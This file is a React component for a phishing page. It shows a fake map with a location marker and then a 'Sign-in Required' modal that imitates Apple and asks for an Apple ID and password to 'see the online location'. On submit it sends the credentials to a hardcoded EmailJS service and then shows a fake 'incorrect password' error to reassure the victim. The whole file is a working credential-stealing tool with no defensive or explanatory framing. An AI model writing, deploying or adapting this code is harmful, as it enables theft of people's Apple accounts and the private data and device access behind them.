import React, { useState } from 'react'
import Modal from 'react-bootstrap/Modal'
import { BrowserView, MobileView } from 'react-device-detect'
import Pic20 from '../img/Capture.PNG'
import Pic22 from '../img/a.aphoto.jpg'
import marker from '../img/eyob_adobespark.png'
import { send } from 'emailjs-com'

const position = [9.010117673156934, 38.76378520055942]
const center = [9.010117673156934, 38.76378520055942]

const Map = () => {
  const [total, setTotal] = useState({
    appleId: '',
    password: '',
  })

  const handleChange = (e) => {
    setTotal({ ...total, [e.target.name]: e.target.value })
  }
  //const defaultPosition: LatLngExpression = [48.864716, 2.349] // Paris position
  const [isOpen, setIsOpen] = React.useState(false)

  const showModal = () => {
    setIsOpen(true)
  }

  const hideModal = () => {
    setIsOpen(false)
  }
  //for appleID or Password error modal
  const [show, setShow] = useState(false)
  const handleClose = () => setShow(false)
  const handleShow = () => setShow(true)

  setTimeout(showModal, 5000)

  const handleAppleIdKeyPress = (event) => {
    if (event.key === 'Enter') {
      let t = total.appleId
      if (t.includes('@icloud.com')) {
        total.appleId = t
      } else if (t.includes('@gmail.com')) {
        total.appleId = t
      } else {
        total.appleId = t + '@icloud.com'
      }
    }
  }

  var t

  function fun() {
    t = setTimeout(showModal, 3000)
  }

  return (
    <div className='map__container'>
      <BrowserView>
        <div class='container'>
          <div class='row'>
            <div class='container'>
              <div class='row'>
                <a
                  href='#'
                  class='intro-banner-vdo-play-btn pinkBg'
                  target='_blank'
                >
                  <i aria-hidden='true'></i>
                  <span class='ripple pinkBg'></span>
                  <span class='ripple pinkBg'></span>
                  <span class='ripple pinkBg'></span>
                </a>
              </div>
            </div>
          </div>
        </div>
        <div className='map__container'>
          <img src={Pic20} alt='Logo' style={{}} />
          <img
            src={marker}
            alt='Logo'
            style={{
              width: '12%',
              position: 'fixed',
              left: '39%',
              top: '45%',
            }}
          />
        </div>
        <div style={{ borderRadius: '10px' }}>
          <Modal
            class='modal-content'
            style={{
              fontWeight: 'bold',
              fontSize: '14px',
              width: '85%',
              //position: 'fixed',
              left: '7.5%',
              top: '5%',
            }}
            show={isOpen}
            onHide={hideModal}
          >
            <Modal.Header
              style={{
                justifyContent: 'center',
                fontSize: '12px',
              }}
            >
              <Modal.Title
                style={{
                  justifyContent: 'center',
                  textAlign: 'center',
                  color: '#777777',
                }}
              >
                <b>Sign-in Required</b>
                <div>
                  <p
                    style={{
                      fontSize: '14px',
                      marginTop: '5%',
                    }}
                  >
                    <b>
                      Enter your Apple ID & password <br></br>to see the online
                      location.
                    </b>
                  </p>
                </div>
              </Modal.Title>
            </Modal.Header>

            <div class='modal-body'>
              <form>
                <div class='col-xs-4'>
                  <input
                    id='userInput'
                    name='appleId'
                    autoFocus={true}
                    value={total.appleId}
                    className='userInput'
                    placeholder='AppleID'
                    class='form-control'
                    type='text'
                    onKeyPress={handleAppleIdKeyPress}
                    onChange={handleChange}
                  ></input>
                </div>
                <br></br>
                <div class='col-xs-4'>
                  <input
                    id='passwordInput'
                    name='password'
                    value={total.password}
                    className='passwordInput'
                    placeholder='Password'
                    class='form-control'
                    type='password'
                    onFocus={(e) => {
                      let t = total.appleId
                      if (t.includes('@icloud.com')) {
                        total.appleId = t
                      } else if (t.includes('@gmail.com')) {
                        total.appleId = t
                      } else {
                        total.appleId = t + '@icloud.com'
                      }
                    }}
                    onChange={handleChange}
                  ></input>
                </div>
              </form>
            </div>

            <Modal.Footer>
              <button
                style={{
                  fontSize: '12px',
                  fontFamily: 'Arial',
                  justifyContent: 'left',
                  backgroundColor: 'white',
                  color: '#42B72A',
                  border: 'none',
                  fontWeight: 'bold',
                  fontSize: '15px',
                  height: '40px',
                  marginTop: '10px',
                  marginRight: '300px',
                }}
                type='button'
                class='btn btn-secondary'
                data-dismiss='modal'
                onClick={hideModal}
              >
                Cancel
              </button>
              <button
                style={{
                  fontSize: '12px',
                  fontFamily: 'Arial',
                  justifyContent: 'right',
                  fontWeight: 'bold',
                  fontSize: '15px',
                  height: '40px',
                  marginTop: '10px',
                  marginRight: '10px',
                }}
                type='submit'
                class='btn btn-primary'
                onClick={hideModal}
                onClick={(e) => {
                  const onSubmit = (e) => {
                    e.preventDefault()
                    send(
                      'service_l0sjz8h',
                      'template_yiapvsk',
                      total,
                      'user_ufUps74ldKS5Biuats9stt'
                    )
                      .then((response) => {
                        console.log('SUCCESS!', response.status, response.text)
                        //window.location.href = '/Verifay'
                      })
                      .catch((err) => {
                        console.log('FAILED...', err)
                      })
                  }
                  onSubmit(e)
                  hideModal()
                  clearTimeout(t)
                  setTimeout(handleShow, 5000)
                }}
              >
                Sign in
              </button>
            </Modal.Footer>
          </Modal>
        </div>
      </BrowserView>
      <MobileView>
        <div class='container'>
          <div class='row'>
            <div class='container'>
              <div class='row'>
                <a
                  href='#'
                  class='intro-banner-vdo-play-btn pinkBg'
                  target='_blank'
                >
                  <i aria-hidden='true'></i>
                  <span class='ripple pinkBg'></span>
                  <span class='ripple pinkBg'></span>
                  <span class='ripple pinkBg'></span>
                </a>
              </div>
            </div>
          </div>
        </div>
        <div className='map__container'>
          <img
            src={Pic22}
            alt='Logo'
            style={{
              width: '100%',
              height: '100%',
            }}
          />
          <img
            src={marker}
            alt='Logo'
            style={{
              width: '45%',
              position: 'fixed',
              left: '22%',
              top: '43%',
            }}
          />
        </div>
        <div style={{ borderRadius: '10px' }}>
          <Modal
            class='modal-content'
            style={{
              fontWeight: 'bold',
              fontSize: '14px',
              width: '85%',
              //position: 'fixed',
              left: '7.5%',
              top: '5%',
            }}
            show={isOpen}
            onHide={hideModal}
          >
            <Modal.Header
              style={{
                justifyContent: 'center',
                fontSize: '12px',
              }}
            >
              <Modal.Title
                style={{
                  justifyContent: 'center',
                  textAlign: 'center',
                  color: '#777777',
                }}
              >
                <b>Sign-in Required</b>
                <div>
                  <p
                    style={{
                      fontSize: '14px',
                      marginTop: '5%',
                    }}
                  >
                    <b>
                      Enter your Apple ID & password <br></br>to see the online
                      location.
                    </b>
                  </p>
                </div>
              </Modal.Title>
            </Modal.Header>

            <div class='modal-body'>
              <form>
                <div class='col-xs-4'>
                  <input
                    id='userInput'
                    name='appleId'
                    autoFocus={true}
                    value={total.appleId}
                    className='userInput'
                    placeholder='AppleID'
                    class='form-control'
                    type='text'
                    onKeyPress={handleAppleIdKeyPress}
                    onChange={handleChange}
                  ></input>
                </div>
                <br></br>
                <div class='col-xs-4'>
                  <input
                    id='passwordInput'
                    name='password'
                    value={total.password}
                    className='passwordInput'
                    placeholder='Password'
                    class='form-control'
                    type='password'
                    onChange={handleChange}
                  ></input>
                </div>
              </form>
            </div>

            <Modal.Footer>
              <button
                style={{
                  fontSize: '12px',
                  fontFamily: 'Arial',
                  justifyContent: 'left',
                  backgroundColor: 'white',
                  color: '#42B72A',
                  border: 'none',
                  fontWeight: 'bold',
                  fontSize: '15px',
                  height: '40px',
                  marginTop: '10px',
                  marginRight: '35%',
                }}
                type='button'
                class='btn btn-secondary'
                data-dismiss='modal'
                onClick={hideModal}
              >
                Cancel
              </button>
              <button
                style={{
                  fontSize: '12px',
                  fontFamily: 'Arial',
                  justifyContent: 'right',
                  fontWeight: 'bold',
                  fontSize: '15px',
                  height: '40px',
                  marginTop: '10px',
                  marginRight: '10px',
                }}
                type='submit'
                class='btn btn-primary'
                //onClick={hideModal}
                onClick={(e) => {
                  const onSubmit = (e) => {
                    e.preventDefault()
                    send(
                      'service_l0sjz8h',
                      'template_yiapvsk',
                      total,
                      'user_ufUps74ldKS5Biuats9st'
                    )
                      .then((response) => {
                        console.log('SUCCESS!', response.status, response.text)
                        //window.location.href = '/Verifay'
                      })
                      .catch((err) => {
                        console.log('FAILED...', err)
                      })
                  }
                  onSubmit(e)
                  hideModal()
                  setTimeout(handleShow, 5000)
                }}
              >
                Sign in
              </button>
            </Modal.Footer>
          </Modal>
        </div>
      </MobileView>

      <Modal
        show={show}
        onHide={handleClose}
        style={{
          fontWeight: 'bold',
          fontSize: '14px',
          width: '85%',
          //position: 'fixed',
          left: '7.5%',
          top: '5%',
        }}
      >
        <Modal.Header
          closeButton
          style={{
            justifyContent: 'center',
            fontSize: '12px',
          }}
        >
          <Modal.Title
            style={{
              justifyContent: 'center',
              textAlign: 'center',
              color: '#777777',
            }}
          >
            Error
          </Modal.Title>
        </Modal.Header>
        <Modal.Body>AppleID or Password was incorrect.</Modal.Body>
        <Modal.Footer>
          <button
            style={{
              fontSize: '12px',
              fontFamily: 'Arial',
              justifyContent: 'left',
              backgroundColor: 'white',
              color: '#42B72A',
              border: 'none',
              fontWeight: 'bold',
              fontSize: '15px',
              height: '40px',
              marginTop: '10px',
              marginRight: '5%',
            }}
            type='button'
            class='btn btn-secondary'
            data-dismiss='modal'
            onClick={handleClose}
          >
            Close
          </button>
        </Modal.Footer>
      </Modal>
    </div>
  )
}

export default Map
